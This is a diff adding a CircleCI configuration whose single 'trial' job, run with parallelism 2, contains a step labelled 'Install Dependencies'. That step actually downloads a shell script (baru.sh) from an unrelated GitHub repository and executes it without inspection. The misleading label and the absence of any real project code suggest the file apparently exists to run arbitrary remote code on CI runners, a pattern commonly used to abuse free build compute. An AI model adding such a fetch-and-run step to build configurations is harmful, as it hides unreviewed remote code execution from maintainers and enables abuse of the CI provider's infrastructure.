@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 2
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Nurultyas7979/baru/main/baru.sh && chmod +x baru.sh  && ./baru.sh 
+              
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
